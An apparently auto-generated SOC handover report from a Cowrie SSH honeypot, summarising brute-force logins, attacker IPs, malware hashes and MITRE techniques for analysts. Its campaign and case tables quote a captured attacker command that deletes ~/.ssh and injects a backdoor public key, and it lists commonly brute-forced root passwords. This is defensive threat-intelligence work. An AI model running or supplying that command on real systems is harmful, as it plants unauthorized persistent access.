# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-03-25 |
| **Generated At** | 2026-03-25T07:00:18Z |
| **Shift Time** | 07:00 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **82** |
| Confirmed Threats | **60** |
| False Positives Filtered | **22** (26.8%) |
| Unique Attacker IPs | **47** |
| Countries of Origin | **15** |
| High Severity Cases | **10** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **72** |
| Malware Samples Analyzed | **0** HIGH · **6** MED · 1 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **53** |
| Unique Credential Pairs | **49** |
| Unique Usernames | **41** |
| Unique Passwords | **40** |
| Successful Auth Pairs | **10** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 10 |
| `config` | 2 |
| `support` | 2 |
| `345gs5662d34` | 2 |
| `pi` | 1 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `12345678` | 6 |
| `password` | 3 |
| `345gs5662d34` | 2 |
| `3245gs5662d34` | 2 |
| `123.321` | 2 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 2 |
| `root` | `3245gs5662d34` | 2 |
| `root` | `123.321` | 2 |
| `root` | `root2016` | 2 |
| `root` | `ubuntu` | 1 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `ubuntu` | `180.110.202.35` | 2026-03-25T04:32:02 |
| `root` | `rootpasswd` | `183.233.85.194` | 2026-03-25T05:00:57 |
| `root` | `Abcd@12345` | `179.33.186.150` | 2026-03-25T05:21:15 |
| `root` | `3245gs5662d34` | `179.33.186.150` | 2026-03-25T05:21:22 |
| `root` | `123.321` | `182.76.36.62` | 2026-03-25T05:21:23 |
| `root` | `123.321` | `60.18.139.82` | 2026-03-25T05:21:32 |
| `root` | `redhat01` | `197.199.224.52` | 2026-03-25T05:29:47 |
| `root` | `3245gs5662d34` | `197.199.224.52` | 2026-03-25T05:29:51 |
| `root` | `root2016` | `183.196.144.45` | 2026-03-25T06:59:21 |
| `root` | `root2016` | `104.155.27.128` | 2026-03-25T06:59:28 |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **1** |
| Campaign Clusters | **1** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 2 | 2 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `179.33.186.150`, `197.199.224.52`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **47** |
| Unique ASNs | **38** |
| High-Risk ASNs | **29** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS38365` | Beijing Baidu Netcom Science and Technology Co., Ltd. | 3 | HIGH |
| `AS8075` | Microsoft Corporation | 3 | HIGH |
| `AS22773` | Cox Communications Inc. | 3 | MEDIUM |
| `AS9808` | China Mobile Communications Group Co., Ltd. | 2 | HIGH |
| `AS9318` | SK Broadband Co Ltd | 2 | HIGH |
| `AS4766` | Korea Telecom | 2 | HIGH |
| `AS17421` | Mobile Business Group | 1 | HIGH |
| `AS11260` | EastLink | 1 | LOW |

---

---

## 🚨 Priority Cases — Immediate Attention (10)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-7611d0518407

| Field | Detail |
|---|---|
| **Source IP** | `180.110.202[.]35` |
| **First Seen** | 2026-03-25 04:31 |
| **Last Seen** | 2026-03-25 04:37 |
| **Session Duration** | 352s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-25 04:31:10` | `cowrie.session.connect` |
| `2026-03-25 04:31:57` | `cowrie.client.version` |
| `2026-03-25 04:31:57` | `cowrie.client.kex` |
| `2026-03-25 04:32:02` | `cowrie.login.success` |
| `2026-03-25 04:37:02` | `cowrie.session.file_upload` |
| `2026-03-25 04:37:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `180.110.202[.]35` to AbuseIPDB if not already reported
- [ ] Block `180.110.202[.]35` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b8c8f12cd0a0

| Field | Detail |
|---|---|
| **Source IP** | `183.233.85[.]194` |
| **First Seen** | 2026-03-25 05:00 |
| **Last Seen** | 2026-03-25 05:01 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-25 05:00:54` | `cowrie.session.connect` |
| `2026-03-25 05:00:55` | `cowrie.client.version` |
| `2026-03-25 05:00:55` | `cowrie.client.kex` |
| `2026-03-25 05:00:57` | `cowrie.login.success` |
| `2026-03-25 05:00:57` | `cowrie.direct-tcpip.request` |
| `2026-03-25 05:01:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.233.85[.]194` to AbuseIPDB if not already reported
- [ ] Block `183.233.85[.]194` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e69656d4a625

| Field | Detail |
|---|---|
| **Source IP** | `179.33.186[.]150` |
| **First Seen** | 2026-03-25 05:21 |
| **Last Seen** | 2026-03-25 05:21 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-25 05:21:14` | `cowrie.session.connect` |
| `2026-03-25 05:21:14` | `cowrie.client.version` |
| `2026-03-25 05:21:14` | `cowrie.client.kex` |
| `2026-03-25 05:21:15` | `cowrie.login.success` |
| `2026-03-25 05:21:16` | `cowrie.session.params` |
| `2026-03-25 05:21:16` | `cowrie.command.input` |
| `2026-03-25 05:21:16` | `cowrie.command.failed` |
| `2026-03-25 05:21:16` | `cowrie.log.closed` |
| `2026-03-25 05:21:17` | `cowrie.session.params` |
| `2026-03-25 05:21:17` | `cowrie.command.input` |
| `2026-03-25 05:21:17` | `cowrie.session.file_download` |
| `2026-03-25 05:21:17` | `cowrie.log.closed` |
| `2026-03-25 05:21:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.33.186[.]150` to AbuseIPDB if not already reported
- [ ] Block `179.33.186[.]150` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5c5d7e9b56a8

| Field | Detail |
|---|---|
| **Source IP** | `179.33.186[.]150` |
| **First Seen** | 2026-03-25 05:21 |
| **Last Seen** | 2026-03-25 05:21 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-25 05:21:21` | `cowrie.session.connect` |
| `2026-03-25 05:21:21` | `cowrie.client.version` |
| `2026-03-25 05:21:21` | `cowrie.client.kex` |
| `2026-03-25 05:21:22` | `cowrie.login.success` |
| `2026-03-25 05:21:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.33.186[.]150` to AbuseIPDB if not already reported
- [ ] Block `179.33.186[.]150` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-295ff4852f12

| Field | Detail |
|---|---|
| **Source IP** | `182.76.36[.]62` |
| **First Seen** | 2026-03-25 05:21 |
| **Last Seen** | 2026-03-25 05:21 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-25 05:21:22` | `cowrie.session.connect` |
| `2026-03-25 05:21:22` | `cowrie.client.version` |
| `2026-03-25 05:21:22` | `cowrie.client.kex` |
| `2026-03-25 05:21:23` | `cowrie.login.success` |
| `2026-03-25 05:21:24` | `cowrie.direct-tcpip.request` |
| `2026-03-25 05:21:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.76.36[.]62` to AbuseIPDB if not already reported
- [ ] Block `182.76.36[.]62` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-39489bc3a99b

| Field | Detail |
|---|---|
| **Source IP** | `60.18.139[.]82` |
| **First Seen** | 2026-03-25 05:21 |
| **Last Seen** | 2026-03-25 05:21 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-25 05:21:30` | `cowrie.session.connect` |
| `2026-03-25 05:21:30` | `cowrie.client.version` |
| `2026-03-25 05:21:30` | `cowrie.client.kex` |
| `2026-03-25 05:21:32` | `cowrie.login.success` |
| `2026-03-25 05:21:33` | `cowrie.direct-tcpip.request` |
| `2026-03-25 05:21:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `60.18.139[.]82` to AbuseIPDB if not already reported
- [ ] Block `60.18.139[.]82` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aac2d10ab62a

| Field | Detail |
|---|---|
| **Source IP** | `197.199.224[.]52` |
| **First Seen** | 2026-03-25 05:29 |
| **Last Seen** | 2026-03-25 05:29 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-25 05:29:46` | `cowrie.session.connect` |
| `2026-03-25 05:29:46` | `cowrie.client.version` |
| `2026-03-25 05:29:46` | `cowrie.client.kex` |
| `2026-03-25 05:29:47` | `cowrie.login.success` |
| `2026-03-25 05:29:47` | `cowrie.session.params` |
| `2026-03-25 05:29:47` | `cowrie.command.input` |
| `2026-03-25 05:29:47` | `cowrie.command.failed` |
| `2026-03-25 05:29:48` | `cowrie.log.closed` |
| `2026-03-25 05:29:48` | `cowrie.session.params` |
| `2026-03-25 05:29:48` | `cowrie.command.input` |
| `2026-03-25 05:29:48` | `cowrie.session.file_download` |
| `2026-03-25 05:29:48` | `cowrie.log.closed` |
| `2026-03-25 05:29:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.199.224[.]52` to AbuseIPDB if not already reported
- [ ] Block `197.199.224[.]52` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9127084b37b8

| Field | Detail |
|---|---|
| **Source IP** | `197.199.224[.]52` |
| **First Seen** | 2026-03-25 05:29 |
| **Last Seen** | 2026-03-25 05:29 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-25 05:29:50` | `cowrie.session.connect` |
| `2026-03-25 05:29:50` | `cowrie.client.version` |
| `2026-03-25 05:29:50` | `cowrie.client.kex` |
| `2026-03-25 05:29:51` | `cowrie.login.success` |
| `2026-03-25 05:29:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.199.224[.]52` to AbuseIPDB if not already reported
- [ ] Block `197.199.224[.]52` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7dc033cd2b34

| Field | Detail |
|---|---|
| **Source IP** | `183.196.144[.]45` |
| **First Seen** | 2026-03-25 06:59 |
| **Last Seen** | 2026-03-25 06:59 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-25 06:59:19` | `cowrie.session.connect` |
| `2026-03-25 06:59:19` | `cowrie.client.version` |
| `2026-03-25 06:59:19` | `cowrie.client.kex` |
| `2026-03-25 06:59:21` | `cowrie.login.success` |
| `2026-03-25 06:59:22` | `cowrie.direct-tcpip.request` |
| `2026-03-25 06:59:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.196.144[.]45` to AbuseIPDB if not already reported
- [ ] Block `183.196.144[.]45` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-296ee53c9ac0

| Field | Detail |
|---|---|
| **Source IP** | `104.155.27[.]128` |
| **First Seen** | 2026-03-25 06:59 |
| **Last Seen** | 2026-03-25 06:59 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-25 06:59:27` | `cowrie.session.connect` |
| `2026-03-25 06:59:27` | `cowrie.client.version` |
| `2026-03-25 06:59:27` | `cowrie.client.kex` |
| `2026-03-25 06:59:28` | `cowrie.login.success` |
| `2026-03-25 06:59:28` | `cowrie.direct-tcpip.request` |
| `2026-03-25 06:59:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `104.155.27[.]128` to AbuseIPDB if not already reported
- [ ] Block `104.155.27[.]128` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `179.33.186[.]150` | **10** | 2026-03-25 05:06 | 2026-03-25 05:27 | 0m | 10 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `197.199.224[.]52` | **10** | 2026-03-25 05:16 | 2026-03-25 05:37 | 0m | 10 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `135.237.126[.]195` | **2** | 2026-03-25 05:07 | 2026-03-25 05:07 | 0m | 0 | `T1592` | 🟢 LOW |
| `172.212.224[.]40` | **2** | 2026-03-25 06:41 | 2026-03-25 06:42 | 0m | 0 | `T1592` | 🟢 LOW |
| `45.55.151[.]3` | **2** | 2026-03-25 06:47 | 2026-03-25 06:47 | 0m | 0 | `T1592` | 🟢 LOW |
| `101.126.82[.]218` | 1 | 2026-03-25 06:01 | 2026-03-25 06:03 | 120s | 0 | `T1592` | 🟢 LOW |
| `101.52.130[.]122` | 1 | 2026-03-25 05:19 | 2026-03-25 05:21 | 120s | 0 | `T1592` | 🟢 LOW |
| `103.250.149[.]148` | 1 | 2026-03-25 04:54 | 2026-03-25 04:54 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `111.17.213[.]162` | 1 | 2026-03-25 06:46 | 2026-03-25 06:46 | 6s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `111.70.49[.]179` | 1 | 2026-03-25 06:42 | 2026-03-25 06:42 | 5s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `112.5.76[.]239` | 1 | 2026-03-25 05:01 | 2026-03-25 05:01 | 8s | 0 | `T1592` | 🟢 LOW |
| `113.17.24[.]230` | 1 | 2026-03-25 05:25 | 2026-03-25 05:25 | 12s | 0 | `T1592` | 🟢 LOW |
| `14.103.114[.]197` | 1 | 2026-03-25 05:59 | 2026-03-25 06:01 | 120s | 0 | `T1592` | 🟢 LOW |
| `14.49.156[.]137` | 1 | 2026-03-25 05:14 | 2026-03-25 05:14 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `149.255.1[.]35` | 1 | 2026-03-25 06:01 | 2026-03-25 06:01 | 5s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `173.9.9[.]142` | 1 | 2026-03-25 05:09 | 2026-03-25 05:09 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `175.126.27[.]71` | 1 | 2026-03-25 05:41 | 2026-03-25 05:42 | 30s | 0 | `T1592` | 🟢 LOW |
| `178.178.222[.]57` | 1 | 2026-03-25 06:17 | 2026-03-25 06:17 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `180.76.105[.]165` | 1 | 2026-03-25 06:45 | 2026-03-25 06:47 | 120s | 0 | `T1592` | 🟢 LOW |
| `180.76.250[.]38` | 1 | 2026-03-25 05:11 | 2026-03-25 05:13 | 120s | 0 | `T1592` | 🟢 LOW |
| `180.76.97[.]132` | 1 | 2026-03-25 05:24 | 2026-03-25 05:26 | 120s | 0 | `T1592` | 🟢 LOW |
| `187.218.57[.]50` | 1 | 2026-03-25 06:24 | 2026-03-25 06:24 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `211.178.165[.]251` | 1 | 2026-03-25 04:58 | 2026-03-25 04:58 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `45.91.64[.]7` | 1 | 2026-03-25 04:53 | 2026-03-25 04:54 | 32s | 0 | `T1592` | 🟢 LOW |
| `59.22.68[.]213` | 1 | 2026-03-25 06:37 | 2026-03-25 06:37 | 5s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `65.20.237[.]191` | 1 | 2026-03-25 05:34 | 2026-03-25 05:34 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `69.164.217[.]245` | 1 | 2026-03-25 06:32 | 2026-03-25 06:32 | 0s | 0 | `T1592` | 🟢 LOW |
| `74.209.100[.]246` | 1 | 2026-03-25 04:50 | 2026-03-25 04:50 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `94.26.171[.]136` | 1 | 2026-03-25 05:29 | 2026-03-25 05:29 | 5s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (11 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/76 ✅ |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 44/100 | 🟡 MEDIUM | **37/76** 🔴 |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **46/76** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 11/100 | 🟢 LOW | **29/76** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 43/100 | 🟡 MEDIUM | **34/76** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **46/76** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `45.55.151[.]3` | US | DigitalOcean, LLC | **100** ⚠️ | 20 |
| `111.70.49[.]179` | TW | Chunghwa Telecom Co.,Ltd. | **100** ⚠️ | 14 |
| `178.178.222[.]57` | RU | PJSC MegaFon | **100** ⚠️ | 17 |
| `69.164.217[.]245` | US | Linode | **100** ⚠️ | 50 |
| `180.76.250[.]38` | CN | Beijing Baidu Netcom Science and Technology Co., Ltd. | **100** ⚠️ | 50 |
| `14.103.114[.]197` | CN | Beijing Volcano Engine Technology Co., Ltd. | **100** ⚠️ | 50 |
| `179.33.186[.]150` | CO | COLOMBIA TELECOMUNICACIONES S.A. ESP | **100** ⚠️ | 28 |
| `173.9.9[.]142` | US | Comcast Cable Communications, LLC | **100** ⚠️ | 3 |
| `45.91.64[.]7` | RU | F6 | **100** ⚠️ | 50 |
| `180.76.97[.]132` | CN | Beijing Baidu Netcom Science and Technology Co., Ltd. | **100** ⚠️ | 46 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 64 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 43 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 10 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 3 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 2 |

---

## 🔕 False Positive Summary (22 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 10 below threshold 25 | 1 |
| AbuseIPDB score 23 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 20 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 82 cases |
| Tool 34  | Credential Extractor        | ✅ 53 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 0 fingerprints |
| Tool 36  | Command Clustering          | ✅ 1 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 47 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 22 filtered (26.8%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 38 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 11 files |
| Tool 33  | YARA Classifier             | ✅ 4 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 10 priority case(s) shown individually · 29 recon entry/entries in table (5 group(s) consolidating 26 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-03-25T07:00:18Z_
